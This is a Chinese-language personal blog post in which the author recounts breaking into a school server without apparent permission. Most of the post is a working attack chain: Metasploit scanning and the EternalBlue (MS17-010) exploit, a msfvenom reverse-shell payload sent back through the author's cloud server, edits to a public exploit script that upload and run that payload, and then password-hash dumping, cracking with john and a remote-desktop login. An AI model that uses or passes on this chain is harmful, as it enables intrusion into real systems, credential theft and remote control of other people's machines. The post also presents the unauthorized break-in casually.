---
layout: post
title: '一次黑进学校服务器的经历'
date: 2018-05-30
author: M3chD09
tags: kali ssh
cover: 'https://www.kali.org/wp-content/uploads/2012/12/kali-wallpaper_1024x768-600x400.png'

---

>The quieter you become, the more you are able to hear.

闲着无聊，扫了一下学校IP段，发现一堆漏洞，于是突发奇想是不是可以利用一下，搞到一台服务器的管理员权限。  
我把目标锁定在一台漏洞百出的某台服务器上，其中`MS17-010`引起了我的兴趣，上网一查居然是臭名昭著的永恒之蓝漏洞。  

### 初次尝试
我首先用msf的`auxiliary/scanner/smb/smb_ms17_010`扫描，确认存在漏洞。  
然后使用`exploit/windows/smb/ms17_010_eternalblue`进行攻击。  
结果是一个大大的FAIL。  

### 失败原因
对方的IP地址是一个公网IP地址，我的是`192.168.1.x`。
RHOST写公网IP，LHOST写局域网地址，不在同一个网段，就算攻击成功，对方也连接不到我这里来呀。  

### 调整思路
我改用了[python版本的exploit](https://github.com/worawit/MS17-010)。  

#### 远程端口转发
我把自己吃灰的云服务器搬出来，使用SSH远程端口转发：  
在服务器上的`/etc/ssh/sshd_config`最后加上一句`GatewayPorts yes`。  
在本地执行`ssh -R 80:localhost:4444 root@IP`将服务器的80端口转发到本地的4444端口。  

#### 生成一个payload
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=服务器IP LPORT=80 -f exe -o /opt/shell.exe`。  

#### 在msf上启用监听
`msf > use exploit/multi/handler`  
`msf exploit(handler) > set payload windows/meterpreter/reverse_tcp`  
`msf exploit(handler) > set LPORT 4444`  
`msf exploit(handler) > set LHOST 0.0.0.0`  
`msf exploit(handler) > exploit -j`  
#### 修改文件
原来的`zzz_exploit.py`只是在C盘根目录创建一个`pwned.txt`文件，修改它以执行payload完成反向连接。  
在
```python
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C$')
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
```
后面加上
```python
	smb_send_file(smbConn, '/opt/shell.exe', 'C', '/shell.exe')     
	service_exec(conn, r'cmd /c  c:\\shell.exe') 
```
最后执行`python zzz_exploit.py IP`成功完成攻击。  

### 维持访问
我第一次成功黑进学校的服务器，面对屏幕上的meterpreter，甚至有点不知所措。  
根据网上的教程，我首先`hashdump`提取了密码散列，然后使用`john`轻松解出了其中一个管理员密码。  
执行`rdesktop -u user -p password IP`成功获取图形化界面。  
既然知道登录账号密码了，就没有必要安装后门程序了。  
我也不打算利用这台服务器做什么坏事，就这样吧。  
![](/assets/img/kali/server-hacked.png)

